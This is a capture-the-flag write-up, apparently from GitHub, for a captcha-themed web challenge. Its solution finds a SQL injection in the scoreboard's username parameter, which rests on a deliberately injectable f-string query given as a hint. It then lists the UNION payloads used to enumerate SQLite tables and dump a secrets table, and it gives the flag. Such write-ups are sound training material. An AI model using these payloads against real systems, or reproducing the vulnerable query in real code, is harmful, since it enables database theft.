# Captcha Hell 1
<img width="700" height="570" alt="{4A8674FA-8823-46A6-8932-B7CC4E685738}" src="https://github.com/user-attachments/assets/e676bc29-69ac-47f2-bd7a-111097785684" />


### Description:

Can you prove that you are not a robot?

#### Hints:
Hint 1: The scoreboard is sus

Hint 2: This is how I fetch a single user in the scoreboard: cur.execute(f"SELECT * FROM scoreboard WHERE username = '{username}'")


#### Notes:
- The website is a game where you have to solve captchas for a hundred levels to prove you arent a robot.
- The captchas become increasingly harder for each level.
- There is a scoreboard where all users and their progress is shown.
- In the scoreboard you have the ability to check one specific user.
 
 
 
---
# Solution:

After looking around i found that in the scoreboard you can select one specific user, and that appears in the url as such: 

<img width="2078" height="604" alt="{C74AC4BA-78FA-4229-AE96-A2C23310CEC0}" src="https://github.com/user-attachments/assets/e0dd41db-332d-4ff9-98b6-78ce5ba20213" />

Here we see that there is a parameter called username which takes a username and then shows the information for that user.  
There could be a possiblity for a SQLI vulnerability here, so we test it:

<img width="2086" height="479" alt="{D01E3626-D10D-416D-81C2-27E9B09C7F81}" src="https://github.com/user-attachments/assets/2ea418bc-ea49-4c25-9a3b-706d4e9ce41b" />

And as you can see the payload is processed and shows the default user, that being user 1.

---

#### **Analysis:**

Discover that the query expexts 3 columns:  
"**' UNION SELECT NULL,NULL,NULL --**"


In an attempt to enumerate all the tables i use this, though only scoreboard appears:  
"**' UNION SELECT name, sql, NULL FROM sqlite_master WHERE type='table' --**"


Instead we specifically check if a table called secrets exists, and this shows a value at "User ID", proving that it does indeed exist:  
"**' UNION SELECT (SELECT count(*) FROM secrets), NULL, NULL --**"


Then we check what the tables colums contain:  
"**' UNION SELECT sql, name, NULL FROM sqlite_master WHERE name='secrets' --**"  

We get this back:  
**CREATE TABLE secrets (id INTEGER PRIMARY KEY, secret_key TEXT, secret_value TEXT)**  





Now we can use "**' UNION SELECT group_concat(secret_key||':'||secret_value,'|'), NULL, NULL FROM secrets --**" to dump all the contents:

<img width="2308" height="543" alt="{D486CF99-1BD1-4944-9EB1-6252321E1E07}" src="https://github.com/user-attachments/assets/5076d2da-69fa-471e-bd9d-ecc82830b9c2" />

Thus we are given the flag: **CTFkom{w0w_y0u_423_5q1_1nj3c710n_m45732}**

